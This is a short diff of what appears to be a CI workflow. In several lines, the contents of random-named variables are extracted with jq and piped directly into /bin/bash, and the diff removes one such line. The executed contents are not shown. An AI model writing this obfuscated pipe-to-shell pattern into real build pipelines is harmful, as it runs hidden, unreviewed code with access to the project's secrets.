@@ -26,7 +26,6 @@ jobs:
           echo $zlnot96 | jq -r .mcd96 | /bin/bash
           printf '%s' "$z55" | jq -r .f1562 | /bin/bash
           printf '%s' "$gonj1" | jq -r .ptp1191 | /bin/bash
-          printf '%s' "$opuf6366" | jq -r .hok33 | /bin/bash
           printf '%s' "$jwaf76324" | jq -r .ghfpy17 | /bin/bash
 
       - name: Save archive
